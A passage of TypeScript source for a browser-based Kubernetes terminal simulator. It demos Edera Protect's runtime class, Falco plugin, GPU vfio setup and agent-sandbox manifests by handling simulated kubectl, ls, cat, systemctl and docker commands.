        resource === "deploy"
      ) {
        if (deployments.length === 0) {
          printHtml(`<span style="color:#a8cfca;">No resources found.</span>`);
          return true;
        }

        const rows = deployments.map((deployment) => [
          deployment.name,
          `${deployment.readyReplicas}/${deployment.replicas}`,
          String(deployment.replicas),
          String(deployment.readyReplicas),
        ]);
        printPre(
          formatTerminalTable(
            ["NAME", "READY", "UP-TO-DATE", "AVAILABLE"],
            rows,
          ),
        );
        markDemoStepComplete("deployment-list");
        return true;
      }

      if (
        resource === "namespaces" ||
        resource === "namespace" ||
        resource === "ns"
      ) {
        const rows = namespaces.map((namespace) => [
          namespace.name,
          namespace.status,
          namespace.age,
        ]);
        printPre(
          formatTerminalTable(
            ["NAME", "STATUS", "AGE"],
            rows,
          ),
        );

        return true;
      }
    }
    if (tokens[1] === "wait") {
      const target = tokens.find((token) => token.startsWith("job/"));
      if (!target) {
        printHtml(`<span style="color:#ff7373;">Usage: kubectl wait --for=condition=complete job/<name> [--timeout=120s]</span>`);
        return true;
      }
      const jobName = target.slice(4);
      const job = jobs.find((item) => item.name === jobName && item.namespace === "default");
      if (!job) {
        printHtml(`<span style="color:#ff7373;">Error from server (NotFound): jobs.batch "${escapeHtml(jobName)}" not found</span>`);
        return true;
      }
      markJobComplete(job);
      bindStorage();
      checkPendingPods();
      for (const deployment of deployments) deployment.readyReplicas = pods.filter((pod) => pod.ownerDeployment === deployment.name && pod.status === "Running").length;
      updateDashboard();
      printHtml(`<span style="color:#b8ff3c;">job.batch/${escapeHtml(jobName)} condition met</span>`);
      return true;
    }

    if (
      tokens[1] === "label" &&
      (tokens[2] === "pod" ||
        tokens[2] === "pods")
    ) {
      const podName = tokens[3];
      const labelExpression = tokens[4];

      const pod = pods.find(
        (item) => item.name === podName,
      );

      if (!pod) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): pods "${escapeHtml(
            podName || "",
          )}" not found</span>`,
        );
        return true;
      }

      if (!labelExpression) {
        printHtml(
          `<span style="color:#ff7373;">Error: label required.</span>`,
        );
        return true;
      }

      if (!pod.labels) {
        pod.labels = {};
      }

      if (labelExpression.includes("=")) {
        const [key, ...valueParts] =
          labelExpression.split("=");

        pod.labels[key] = valueParts.join("=") || "";
      } else {
        pod.labels[labelExpression] = "";
      }

      addEvent(
        "Normal",
        "Labeled",
        `pod/${pod.name}`,
        `Pod labeled with ${labelExpression}`,
      );

      printHtml(
        `<span style="color:#b8ff3c;">pod/${escapeHtml(
          pod.name,
        )} labeled</span>`,
      );

      updateDashboard();

      return true;
    }
    if (
      tokens[1] === "label" &&
      (tokens[2] === "node" ||
        tokens[2] === "nodes")
    ) {
      const nodeName = tokens[3];
      const labelExpression = tokens[4];

      const node = nodes.find(
        (item) => item.name === nodeName,
      );

      if (!node) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): nodes "${escapeHtml(
            nodeName || "",
          )}" not found</span>`,
        );
        return true;
      }

      if (!labelExpression) {
        printHtml(
          `<span style="color:#ff7373;">Error: label required.</span>`,
        );
        return true;
      }

      if (labelExpression.includes("=")) {
        const [key, value] =
          labelExpression.split("=");

        node.labels[key] = value || "";
      } else {
        node.labels[labelExpression] = "";
      }

      addEvent(
        "Normal",
        "Labeled",
        `node/${node.name}`,
        `Node labeled with ${labelExpression}`,
      );

      printHtml(
        `<span style="color:#b8ff3c;">node/${escapeHtml(
          node.name,
        )} labeled</span>`,
      );

      checkPendingPods();
      updateDashboard();

      if (
        node.name === "node-3" &&
        labelExpression === "runtime=edera"
      ) {
        markDemoStepComplete("edera-node-label");
      }

      return true;
    }
    if (tokens[1] === "delete" && tokens[2] === "-f") {
      const requestedPath = tokens[3];
      const manifestPath = requestedPath ? resolveVirtualPath(requestedPath) : "";
      const fileName = manifestPath ? virtualBasename(manifestPath) : "";

      if (!requestedPath || !getVirtualFile(manifestPath)) {
        printHtml(
          `<span style="color:#ff7373;">error: the path "${escapeHtml(
            requestedPath || "",
          )}" does not exist</span>`,
        );
        return true;
      }

      if (fileName === "runtimeclass-edera.yaml") {
        if (!activeRuntimeClasses.has("edera")) {
          printHtml(
            `<span style="color:#a8cfca;">runtimeclass.node.k8s.io/edera not found</span>`,
          );
          return true;
        }

        activeRuntimeClasses.delete("edera");

        addEvent(
          "Normal",
          "Deleted",
          "runtimeclass/edera",
          "runtimeclass.node.k8s.io/edera deleted",
        );
        const affectedPods = pods.filter(
          (pod) =>
            pod.runtimeClassName === "edera" &&
            pod.status === "Running",
        );

        for (const pod of affectedPods) {
          const attachedWorkloads = protectWorkloads.filter(
            (workload) => workload.sourcePodName === pod.name,
          );

          protectWorkloads = protectWorkloads.filter(
            (workload) => workload.sourcePodName !== pod.name,
          );

          pod.status = "Failed";
          pod.node = "<none>";
          pod.ip = "<none>";

          addEvent(
            "Warning",
            "RuntimeClassUnavailable",
            `pod/${pod.name}`,
            `Pod ${pod.name} failed: RuntimeClass "edera" is no longer available`,
          );

          for (const workload of attachedWorkloads) {
            addEvent(
              "Normal",
              "WorkloadTerminated",
              `workload/${workload.name}`,
              `Workload ${workload.name} removed because RuntimeClass "edera" was deleted`,
            );
          }
        }

        for (const deployment of deployments) {
          const deploymentPods = pods.filter((pod) => pod.ownerDeployment === deployment.name && pod.status === "Running");
          for (const pod of deploymentPods) {
            pod.status = "Failed";
            pod.node = "<none>";
            pod.ip = "<none>";
            const attachedWorkloads = protectWorkloads.filter((workload) => workload.sourcePodName === pod.name);
            protectWorkloads = protectWorkloads.filter((workload) => workload.sourcePodName !== pod.name);
            addEvent("Warning", "RuntimeClassUnavailable", `pod/${pod.name}`, `Pod ${pod.name} failed: RuntimeClass "edera" is no longer available`);
            for (const workload of attachedWorkloads) {
              addEvent("Normal", "WorkloadTerminated", `workload/${workload.name}`, `Workload ${workload.name} removed because RuntimeClass "edera" was deleted`);
            }
          }
          deployment.readyReplicas = 0;
        }

        printHtml(
          `<span style="color:#b8ff3c;">runtimeclass.node.k8s.io/edera deleted</span>`,
        );

        if (affectedPods.length > 0) {
          printHtml(
            `<span style="color:#ffd166;">${affectedPods.length} Edera pod${
              affectedPods.length === 1 ? "" : "s"
            } moved to Failed because RuntimeClass "edera" is no longer available. Recreate the RuntimeClass to recover the pod, or re-apply its manifest.</span>`,
          );
        }

        updateDashboard();
        return true;
      }

      if (fileName === "nginx-deployment.yaml") {
        const deploymentName = "nginx";
        const index = deployments.findIndex((deployment) => deployment.name === deploymentName);
        if (index === -1) {
          printHtml(`<span style="color:#a8cfca;">deployment.apps/${deploymentName} not found</span>`);
          return true;
        }
        const ownedPods = pods.filter((pod) => pod.ownerDeployment === deploymentName);
        pods = pods.filter((pod) => pod.ownerDeployment !== deploymentName);
        deployments.splice(index, 1);
        protectWorkloads = protectWorkloads.filter((workload) => !ownedPods.some((pod) => pod.name === workload.sourcePodName));
        addEvent("Normal", "Deleted", `deployment/${deploymentName}`, `deployment.apps/${deploymentName} deleted`);
        updateDashboard();
        printHtml(`<span style="color:#b8ff3c;">deployment.apps/${deploymentName} deleted</span>`);
        return true;
      }

      const manifestPodName =
        fileName === "pod-nginx.yaml"
          ? "edera-protect-pod"
          : fileName === "pod-hardened-vessel.yaml"
            ? "hardened-vessel"
            : null;

      if (manifestPodName) {
        const index = pods.findIndex(
          (pod) =>
            pod.name === manifestPodName &&
            pod.namespace === "default",
        );

        if (index === -1) {
          printHtml(
            `<span style="color:#a8cfca;">pod/${escapeHtml(
              manifestPodName,
            )} not found</span>`,
          );
          return true;
        }

        const [deletedPod] = pods.splice(index, 1);

        const attachedWorkloads = protectWorkloads.filter(
          (workload) => workload.sourcePodName === manifestPodName,
        );

        protectWorkloads = protectWorkloads.filter(
          (workload) => workload.sourcePodName !== manifestPodName,
        );

        addEvent(
          "Normal",
          "Deleted",
          `pod/${manifestPodName}`,
          `pod/${manifestPodName} deleted from manifest`,
        );

        for (const workload of attachedWorkloads) {
          addEvent(
            "Normal",
            "WorkloadTerminated",
            `workload/${workload.name}`,
            `Workload ${workload.name} removed with pod ${manifestPodName}`,
          );
        }

        updateDashboard();

        printHtml(
          `<span style="color:#b8ff3c;">pod/${escapeHtml(
            deletedPod.name,
          )} deleted</span>`,
        );

        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">error: delete for "${escapeHtml(
          fileName,
        )}" is not supported by this simulator</span>`,
      );
      return true;
    }
    if (
      tokens[1] === "delete" &&
      (tokens[2] === "pod" ||
        tokens[2] === "pods")
    ) {
      const podName = tokens[3];

      const index = pods.findIndex(
        (pod) =>
          pod.name === podName &&
          pod.namespace === "default",
      );

      if (index === -1) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): pods "${escapeHtml(
            podName || "",
          )}" not found</span>`,
        );
        return true;
      }

      const deletedPod = pods[index];
      const owningDeployment = deletedPod.ownerDeployment;

      pods.splice(index, 1);

      const attachedWorkloads = protectWorkloads.filter(
        (workload) => workload.sourcePodName === podName,
      );

      protectWorkloads = protectWorkloads.filter(
        (workload) => workload.sourcePodName !== podName,
      );

      addEvent(
        "Normal",
        "Terminated",
        `pod/${podName}`,
        `Pod ${podName} deleted`,
      );

      for (const workload of attachedWorkloads) {
        addEvent(
          "Normal",
          "WorkloadTerminated",
          `workload/${workload.name}`,
          `Workload ${workload.name} removed with pod ${podName}`,
        );
      }

      if (owningDeployment) {
        reconcileDeployments();

        const replacement = pods.find(
          (pod) =>
            pod.ownerDeployment === owningDeployment &&
            pod.name !== podName &&
            pod.status === "Running",
        );

        if (replacement) {
          addEvent(
            "Normal",
            "ReplicaCreated",
            `deployment/${owningDeployment}`,
            `Deployment ${owningDeployment} recreated a replacement pod ${replacement.name}`,
          );
        }
      }

      updateDashboard();

      printHtml(
        `<span style="color:#b8ff3c;">pod "${escapeHtml(
          podName,
        )}" deleted</span>`,
      );

      if (owningDeployment) {
        printHtml(
          `<span style="color:#00e5d4;">Deployment ${escapeHtml(
            owningDeployment,
          )} reconciled its desired replica count.</span>`,
        );
      }

      return true;
    }
    if (
      tokens[1] === "delete" &&
      (tokens[2] === "node" ||
        tokens[2] === "nodes")
    ) {
      const nodeName = tokens[3];

      const index = nodes.findIndex(
        (node) => node.name === nodeName,
      );

      if (index === -1) {
        printHtml(
          `<span style="color:#ff7373;">Error from server (NotFound): nodes "${escapeHtml(
            nodeName || "",
          )}" not found</span>`,
        );
        return true;
      }

      nodes.splice(index, 1);

      addEvent(
        "Warning",
        "NodeDeleted",
        `node/${nodeName}`,
        `Node ${nodeName} removed from cluster`,
      );

      pods.forEach((pod) => {
        if (pod.node === nodeName) {
          pod.status = "Pending";
          pod.node = "<none>";
          pod.ip = "<none>";

          addEvent(
            "Warning",
            "NodeEviction",
            `pod/${pod.name}`,
            `Pod evicted from deleted node ${nodeName}; waiting for a schedulable node`,
          );
        }
      });

      checkPendingPods();

      for (const deployment of deployments) {
        deployment.readyReplicas = pods.filter((pod) => pod.ownerDeployment === deployment.name && pod.status === "Running").length;
      }

      updateDashboard();

      printHtml(
        `<span style="color:#b8ff3c;">node "${escapeHtml(
          nodeName,
        )}" deleted</span>`,
      );

      return true;
    }

    if (
      tokens[1] === "--help" ||
      tokens[1] === "-h" ||
      tokens.length === 1
    ) {
      printHtml(formatHelpText());
      return true;
    }

    return false;
  };
  try {
    cluster = new Cluster();

    cluster.registerImage(WebServerImage);

    await cluster.init();

    await cluster.apply([
      {
        apiVersion: "v1",
        kind: "Service",
        metadata: {
          name: "demo-service",
        },
        spec: {
          type: "NodePort",
          ports: [
            {
              port: 80,
              targetPort: 8080,
              nodePort: 31000,
              protocol: "TCP",
            },
          ],
          selector: {
            app: "demo",
          },
        },
      },
    ]);

    addEvent(
      "Normal",
      "ClusterInitialized",
      "cluster",
      "Webernetes browser cluster online",
    );

    await new Promise((resolve) =>
      setTimeout(resolve, 500),
    );

    updateDashboard();
    renderEvents();
    renderGuide();

    output.innerHTML = `
      <div class="terminal-block">
        <div style="color:#f8fffd;">
          Webernetes cluster online!
        </div>

        <div style="color:#a8cfca;margin-top:5px;">
          Try the suggested Edera command below,
          or type <span style="color:#b8ff3c;">help</span>.
        </div>
      </div>
    `;

    input.disabled = false;
    input.focus();

    const handleTerminalKeydown = async (event: KeyboardEvent) => {
        if (event.key === "ArrowUp") {
          event.preventDefault();

          if (
            commandHistory.length > 0 &&
            historyIndex <
              commandHistory.length - 1
          ) {
            historyIndex++;

            input.value =
              commandHistory[
                commandHistory.length -
                  1 -
                  historyIndex
              ];
          }

          return;
        }

        if (event.key === "ArrowDown") {
          event.preventDefault();

          if (historyIndex > 0) {
            historyIndex--;

            input.value =
              commandHistory[
                commandHistory.length -
                  1 -
                  historyIndex
              ];
          } else if (historyIndex === 0) {
            historyIndex = -1;
            input.value = "";
          }

          return;
        }

        if (event.key !== "Enter") {
          return;
        }

        // `cmd | head -n N` runs cmd; the wrapper below trims its output.
        const typedCmd = input.value.trim();
        const rawCmd = parseHeadPipe(typedCmd)?.command ?? typedCmd;

        input.value = "";
        historyIndex = -1;

        if (!rawCmd) {
          return;
        }
        commandHistory.push(typedCmd);
        printCommand(typedCmd);
        let tokens = tokenize(rawCmd);
        if (tokens[0] === "sudo") {
          tokens = tokens.slice(1);
        }
        if (tokens[0] === "kc" || tokens[0] === "k") {
          tokens[0] = "kubectl";
        }
        if (tokens[0] === "p") {
          tokens[0] = "protect";
        }
        if (tokens[0] === "clear") {
          output.innerHTML = "";
          return;
        }
        if (tokens[0] === "history") {
          if (commandHistory.length === 0) {
            printHtml(
              `<span style="color:#a8cfca;">No command history.</span>`,
            );
            return;
          }

          const historyHtml = commandHistory
            .map(
              (command, index) =>
                `<span style="color:#a8cfca;">${String(
                  index + 1,
                ).padStart(3, " ")}</span>  ${escapeHtml(
                  command,
                )}`,
            )
            .join("\n");

          printPre(historyHtml);

          return;
        }
        if (tokens[0] === "vi" || tokens[0] === "nano") {
          const editor = escapeHtml(tokens[0]);

          printHtml(
            `<span style="color:#ff7373;">${editor}: this demo filesystem is read-only; editing local files is not permitted.</span>`,
          );

          addEvent(
            "Warning",
            "ReadOnlyFilesystem",
            "terminal",
            `${tokens[0]} attempted to modify a read-only demo file`,
          );

          return;
        }
        if (
          tokens[0] === "lspci" &&
          tokens.includes("-Dknn") &&
          tokens.includes("-d") &&
          tokens.includes("::03xx")
        ) {
          printPre(
            `<span style="color:#dff7f0;">${escapeHtml(
              gpuVfioBound ? GPU_LSPCI_VFIO : GPU_LSPCI_UNBOUND,
            )}</span>`,
          );

          addEvent(
            "Normal",
            "GpuPciInspected",
            "pci/gpu0",
            gpuVfioBound
              ? `GPU ${GPU_PCI_LOCATION} is bound to vfio-pci`
              : `GPU ${GPU_PCI_LOCATION} detected with vendor/device ID ${GPU_PCI_ID}`,
          );

          markDemoStepComplete("gpu-lspci");
          if (gpuVfioBound) {
            markDemoStepComplete("gpu-vfio-verify");
          }

          return;
        }

        if (
          tokens[0] === "systemctl" &&
          tokens[1] === "restart" &&
          tokens[2] === "protect-daemon"
        ) {
          protectDaemonRestarted = true;

          printHtml(
            `<span style="color:#b8ff3c;">Protect daemon restarted successfully.</span>`,
          );

          addEvent(
            "Normal",
            "ProtectDaemonRestarted",
            "protect-daemon",
            "Protect daemon restarted with the current GPU configuration",
          );

          markDemoStepComplete("gpu-daemon-restart");
          return;
        }

        if (
          tokens[0] === "systemctl" &&
          tokens[1] === "restart" &&
          tokens[2] === "falco"
        ) {
          falcoInstalled = true;
          falcoConfigured = true;
          falcoRulesLoaded = true;
          falcoRunning = true;
          ederaFalcoPluginLoaded = true;
          falcoLogLines = [];
          falcoStreamMode = null;

          printHtml(
            `<span style="color:#b8ff3c;">Falco restarted successfully.</span>`,
          );
          printHtml(
            `<span style="color:#00e5d4;">Loaded plugin: edera</span>`,
          );

          addEvent(
            "Normal",
            "FalcoPluginLoaded",
            "falco/edera",
            "Edera Falco plugin loaded successfully and is waiting for zones",
          );

          markDemoStepComplete("falco-restart");
          return;
        }

        if (
          tokens[0] === "modprobe" &&
          (tokens.includes("vfio_pci") || tokens.includes("vfio-pci"))
        ) {
          gpuVfioBound = true;

          printHtml(
            `<span style="color:#b8ff3c;">vfio_pci loaded; ${GPU_PCI_LOCATION} bound to vfio-pci.</span>`,
          );

          addEvent(
            "Normal",
            "VfioBound",
            `pci/${GPU_PCI_LOCATION}`,
            `NVIDIA GPU ${GPU_PCI_ID} is now bound to vfio-pci`,
          );

          markDemoStepComplete("gpu-vfio-load");
          return;
        }
        if (tokens[0] === "export") {
          const assignment = tokens[1] || "";
          const match = assignment.match(/^AGENT_SANDBOX_VERSION=(.+)$/);
          if (match) {
            agentSandboxVersion = match[1].replace(/^['"]|['"]$/g, "");
            printHtml(
              `<span style="color:#b8ff3c;">AGENT_SANDBOX_VERSION=${escapeHtml(agentSandboxVersion)}</span>`,
            );
            markDemoStepComplete("agent-sandbox-version");
            return;
          }
          printHtml(
            `<span style="color:#ff7373;">export: this simulator supports AGENT_SANDBOX_VERSION only.</span>`,
          );
          return;
        }

        // Object capabilities are exercised from inside the agent workload,
        // not from the host shell, which has ambient network access.
        if (
          (tokens[0] === "git" && tokens[1] === "clone" && /github\.com/.test(tokens[2] || "")) ||
          (tokens[0] === "curl" && /^https?:\/\//.test(tokens[1] || ""))
        ) {
          printHtml(
            `<span style="color:#a8cfca;">This runs on the host. To use the agent's object capabilities, run it inside the agent workload:</span>`,
          );
          printHtml(
            `<span style="color:#b8ff3c;">protect workload exec ${OCAP_WORKLOAD_NAME} -- ${escapeHtml(
              tokens.join(" "),
            )}</span>`,
          );
          return;
        }

        if (tokens[0] === "pwd") {
          printHtml(
            `<span style="color:#dff7f0;">${escapeHtml(
              currentDirectory,
            )}</span>`,
          );
          return;
        }

        if (tokens[0] === "cd") {
          const requestedPath = tokens[1] || "~";
          const targetPath = resolveVirtualPath(requestedPath);

          if (!isVirtualDirectory(targetPath)) {
            printHtml(
              `<span style="color:#ff7373;">cd: ${escapeHtml(
                requestedPath,
              )}: No such file or directory</span>`,
            );
            return;
          }

          currentDirectory = targetPath;
          updateTerminalPrompt();
          return;
        }

        if (tokens[0] === "ls") {
          const args = tokens.slice(1);
          const requestedFlags = args.filter((arg) => arg.startsWith("-"));
          const pathArgs = args.filter((arg) => !arg.startsWith("-"));
          const expandedFlags = requestedFlags
            .filter((flag) => flag.startsWith("-") && !flag.startsWith("--"))
            .flatMap((flag) => flag.slice(1).split(""));
          const longForm = requestedFlags.some((flag) => flag === "--all" || flag === "--long");
          const showAll = expandedFlags.includes("a") || longForm;
          const longListing = expandedFlags.includes("l") || longForm;
          const recursive = expandedFlags.includes("R");
          const supportedLongListing = requestedFlags.length === 0 ||
            requestedFlags.every((flag) => {
              if (flag === "--all" || flag === "--long") return true;
              if (!flag.startsWith("-") || flag.startsWith("--")) return false;
              return [...flag.slice(1)].every((char) => "laR".includes(char));
            });

          if (!supportedLongListing) {
            printHtml(
              `<span style="color:#ff7373;">ls: unsupported option. Try: ls, ls -la, ls -laR, or ls &lt;directory&gt;</span>`,
            );
            return;
          }

          if (pathArgs.length > 1) {
            printHtml(`<span style="color:#ff7373;">ls: too many arguments</span>`);
            return;
          }

          const targetPath = resolveVirtualPath(pathArgs[0] || currentDirectory);

          if (!isVirtualDirectory(targetPath)) {
            printHtml(
              `<span style="color:#ff7373;">ls: cannot access '${escapeHtml(
                pathArgs[0] || targetPath,
              )}': No such file or directory</span>`,
            );
            return;
          }

          const filterHidden = (entries: ReturnType<typeof listVirtualDirectory>) =>
            showAll ? entries : entries.filter((entry) => !entry.name.startsWith("."));

          if (!recursive) {
            const entries = filterHidden(listVirtualDirectory(targetPath));

            if (!longListing) {
              const renderedEntries = entries
                .map(
                  (entry) =>
                    `<span style="color:${
                      entry.isDirectory ? "#00e5d4" : "#5e9f2d"
                    };font-weight:600;">${escapeHtml(entry.name)}${
                      entry.isDirectory ? "/" : ""
                    }</span>`,
                )
                .join("  ");

              printHtml(
                renderedEntries || `<span style="color:#a8cfca;">(empty)</span>`,
              );
              return;
            }

            const fileEntries = entries.filter((entry) => !entry.isDirectory);
            const totalSize = fileEntries.reduce(
              (sum, entry) =>
                sum +
                (localFileMetadata[entry.path]?.size ||
                  getVirtualFile(entry.path)?.length ||
                  0),
              0,
            );

            const listing = [
              `total ${totalSize}`,
              `${READ_ONLY_DIRECTORY_MODE} 1 ivy 197609        0 Apr  9 07:53 ./`,
              `${READ_ONLY_DIRECTORY_MODE} 1 ivy 197609        0 Apr  9 07:42 ../`,
              ...entries.map(formatVirtualLongEntry),
            ].join("\n");

            printPre(`<span style="color:#dff7f0;">${escapeHtml(listing)}</span>`);
            return;
          }

          const sections = listVirtualTree(targetPath);
          const renderedSections: string[] = [];

          for (const section of sections) {
            const entries = filterHidden(section.entries);
            renderedSections.push(formatVirtualDirectoryHeader(section.directory));

            if (longListing) {
              const fileEntries = entries.filter((entry) => !entry.isDirectory);
              const totalSize = fileEntries.reduce(
                (sum, entry) =>
                  sum +
                  (localFileMetadata[entry.path]?.size ||
                    getVirtualFile(entry.path)?.length ||
                    0),
                0,
              );
              renderedSections.push(`total ${totalSize}`);
              renderedSections.push(...entries.map(formatVirtualLongEntry));
            } else {
              renderedSections.push(
                entries
                  .map((entry) => `${entry.name}${entry.isDirectory ? "/" : ""}`)
                  .join("  "),
              );
            }

            renderedSections.push("");
          }

          printPre(`<span style="color:#dff7f0;">${escapeHtml(
            renderedSections.join("\n").trimEnd(),
          )}</span>`);
          return;
        }
        if (tokens[0] === "tree") {
          const args = tokens.slice(1);
          const pathArgs = args.filter((arg) => !arg.startsWith("-"));
          const flags = args.filter((arg) => arg.startsWith("-"));
          const showAll = flags.some((flag) =>
            flag === "--all" || (flag.startsWith("-") && flag.slice(1).includes("a")),
          );

          if (flags.some((flag) => flag !== "-a" && flag !== "--all")) {
            printHtml(`<span style="color:#ff7373;">tree: unsupported option. Try: tree -a or tree &lt;directory&gt;</span>`);
            return;
          }
          if (pathArgs.length > 1) {
            printHtml(`<span style="color:#ff7373;">tree: too many arguments</span>`);
            return;
          }

          const targetPath = resolveVirtualPath(pathArgs[0] || currentDirectory);
          if (!isVirtualDirectory(targetPath)) {
            printHtml(`<span style="color:#ff7373;">tree: '${escapeHtml(pathArgs[0] || targetPath)}': No such file or directory</span>`);
            return;
          }

          const visible = (entries: ReturnType<typeof listVirtualDirectory>) =>
            showAll ? entries : entries.filter((entry) => !entry.name.startsWith("."));
          const lines: string[] = [targetPath === "/" ? "." : virtualBasename(targetPath)];

          const walk = (directory: string, prefix: string) => {
            const entries = visible(listVirtualDirectory(directory));
            entries.forEach((entry, index) => {
              const last = index === entries.length - 1;
              lines.push(`${prefix}${last ? "└── " : "├── "}${entry.name}${entry.isDirectory ? "/" : ""}`);
              if (entry.isDirectory) {
                walk(entry.path, `${prefix}${last ? "    " : "│   "}`);
              }
            });
          };

          walk(targetPath, "");
          printPre(`<span style="color:#dff7f0;">${escapeHtml(lines.join("\n"))}</span>`);
          return;
        }

        if (tokens[0] === "find") {
          const args = tokens.slice(1);
          const startArg = args.find((arg) => !arg.startsWith("-")) || ".";
          const targetPath = resolveVirtualPath(startArg);
          const typeIndex = args.indexOf("-type");
          const type = typeIndex >= 0 ? args[typeIndex + 1] : "";
          const lsMode = args.includes("-ls");
          const allowed = args.every((arg, index) => {
            if (index === typeIndex + 1) return arg === "f" || arg === "d";
            return !arg.startsWith("-") || arg === "-type" || arg === "-ls";
          });

          if (!allowed || (type && type !== "f" && type !== "d")) {
            printHtml(`<span style="color:#ff7373;">find: unsupported expression. Try: find . -type f or find . -ls</span>`);
            return;
          }
          if (!isVirtualDirectory(targetPath)) {
            printHtml(`<span style="color:#ff7373;">find: '${escapeHtml(startArg)}': No such file or directory</span>`);
            return;
          }

          const results: string[] = [];
          const rootPrefix = targetPath === "/" ? "/" : targetPath;
          const walkFind = (directory: string) => {
            for (const entry of listVirtualDirectory(directory)) {
              if (entry.isDirectory) {
                if (type === "d" || (!type && lsMode)) {
                  const relativeDir = entry.path.slice(rootPrefix.length).replace(/^\//, "");
                  results.push(`./${relativeDir || entry.name}`);
                }
                walkFind(entry.path);
              } else if (type !== "d") {
                const relative = entry.path.slice(rootPrefix.length).replace(/^\//, "");
                const display = relative ? `./${relative}` : `./${entry.name}`;
                if (lsMode) {
                  const metadata = localFileMetadata[entry.path] || { size: getVirtualFile(entry.path)?.length || 0, modified: "Apr  9 07:48" };
                  results.push(`197609 ${READ_ONLY_FILE_MODE} 1 ivy ivy ${String(metadata.size).padStart(8, " ")} ${metadata.modified} ${display}`);
                } else {
                  results.push(display);
                }
              }
            }
          };

          if (lsMode) {
            const rootDisplay = ".";
            results.unshift(
              `197609 ${READ_ONLY_DIRECTORY_MODE} 1 ivy ivy ${String(0).padStart(8, " ")} Apr  9 07:53 ${rootDisplay}`,
            );
          }
          walkFind(targetPath);
          if (type === "d" && !lsMode) results.unshift(".");
          if (!results.length) {
            printHtml(`<span style="color:#a8cfca;">(no matches)</span>`);
          } else {
            printPre(`<span style="color:#dff7f0;">${escapeHtml(results.join("\n"))}</span>`);
          }
          return;
        }
        if (tokens[0] === "cat") {
          const fileName = tokens[1];

          if (fileName === "/etc/falco/config.d/falco-edera-config.yaml") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(FALCO_EDERA_CONFIG_YAML)}</span>`,
            );
            falcoConfigured = true;
            markDemoStepComplete("falco-config");
            return;
          }

          if (fileName === "/etc/falco/rules.d/falco-edera-rules.yaml") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(FALCO_EDERA_RULES_YAML)}</span>`,
            );
            falcoRulesLoaded = true;
            markDemoStepComplete("falco-rules");
            return;
          }

          if (fileName === "falco-edera-values.yaml" || fileName === "/falco-edera-values.yaml") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(FALCO_HELM_VALUES_YAML)}</span>`,
            );
            markDemoStepComplete("falco-helm-values");
            return;
          }

          if (fileName === "/var/lib/edera/protect/daemon.toml") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(
                GPU_DAEMON_TOML,
              )}</span>`,
            );

            markDemoStepComplete("gpu-daemon-config");
            return;
          }

          if (fileName === "/etc/modprobe.d/gpu-vfio.conf") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(
                GPU_VFIO_MODPROBE,
              )}</span>`,
            );

            markDemoStepComplete("gpu-vfio-config");
            return;
          }

          if (fileName === "/etc/modules-load.d/gpu-vfio.conf") {
            printPre(
              `<span style="color:#dff7f0;">${escapeHtml(
                GPU_MODULES_LOAD,
              )}</span>`,
            );

            markDemoStepComplete("gpu-vfio-config");
            return;
          }

          if (!fileName) {
            printHtml(
              `<span style="color:#ff7373;">cat: missing file operand</span>`,
            );
          } else {
            const manifestPath = resolveVirtualPath(fileName);
            const manifest = getVirtualFile(manifestPath);

            if (manifest) {
              printPre(highlightFile(manifestPath, manifest));
              if (manifestPath === OCAP_GITHUB_MANIFEST_PATH) {
                markDemoStepComplete("ocap-definition");
              }
              if (manifestPath.endsWith("/agent-sandbox/sandbox.yaml")) {
                markDemoStepComplete("agent-sandbox-manifest");
              }
              if (manifestPath.endsWith("/agent-sandbox/template-and-warm-pool.yaml")) {
                markDemoStepComplete("agent-sandbox-warm-pool");
              }
              if (manifestPath.endsWith("/agent-sandbox/edera-sandbox.yaml")) {
                markDemoStepComplete("edera-sandbox-manifest");
                if (completedDemoSteps.has("edera-fork-inspect")) {
                  markDemoStepComplete("agent-sandbox-security-review");
                }
              }
              if (manifestPath.endsWith("/agent-sandbox/edera-snapshot.yaml")) {
                markDemoStepComplete("edera-snapshot-manifest");
              }
              if (manifestPath.endsWith("/agent-sandbox/edera-fork.yaml")) {
                markDemoStepComplete("edera-fork-manifest");
              }
              if (
                ["/rust/main.rs", "/python/main.py", "/typescript/main.ts"].includes(
                  manifestPath,
                )
              ) {
                markDemoStepComplete("readme-source");
              }
              if (manifestPath === CAPABILITY_PROVIDER_PATH) {
                markDemoStepComplete("provider-manifest");
              }
              if (manifestPath === SANDBOX_TEMPLATE_PATH) {
                markDemoStepComplete("template-manifest");
              }
              if (manifestPath === SANDBOX_SDK_PATH) {
                markDemoStepComplete("sdk-read");
              }
            } else {
              printHtml(
                `<span style="color:#ff7373;">cat: ${escapeHtml(
                  fileName,
                )}: No such file or directory</span>`,
              );
            }
          }

          return;
        }
        if (
          (tokens[0] === "python3" || tokens[0] === "python") &&
          tokens[1] &&
          resolveVirtualPath(tokens[1]) === SANDBOX_SDK_PATH
        ) {
          await runSandboxSdk();
          return;
        }

        // docker build -t <tag> <context> / docker push <tag> for the
        // readme-fetch images. The build replays the context's Dockerfile.
        if (tokens[0] === "docker" && tokens[1] === "build") {
          let tag = "";
          let context = "";
          for (let i = 2; i < tokens.length; i++) {
            if (tokens[i] === "-t" || tokens[i] === "--tag") tag = tokens[++i] || "";
            else if (tokens[i].startsWith("--tag=")) tag = tokens[i].slice(6);
            else if (!tokens[i].startsWith("-")) context = tokens[i];
          }
          const contextPath = resolveVirtualPath(context || ".");
          const dockerfile = getVirtualFile(`${contextPath}/Dockerfile`);
          if (!context || !dockerfile) {
            printHtml(
              `<span style="color:#ff7373;">ERROR: failed to solve: failed to read dockerfile: open Dockerfile: no such file or directory</span>`,
            );
            return;
          }
          const instructions = dockerfile
            .split("\n")
            .map((line) => line.trim())
            .filter((line) => line && !line.startsWith("#"));
          const steps = instructions
            .map(
              (line, index) =>
                `<span style="color:#00e5d4;">#${index + 1}</span> <span style="color:#dff7f0;">[${index + 1}/${instructions.length}] ${escapeHtml(line)}</span>`,
            )
            .join("\n");
          printPre(
            `${steps}\n<span style="color:#b8ff3c;">naming to ${escapeHtml(
              tag || "<none>",
            )} done</span>`,
          );
          if (tag) {
            cachedProtectImages.add(tag);
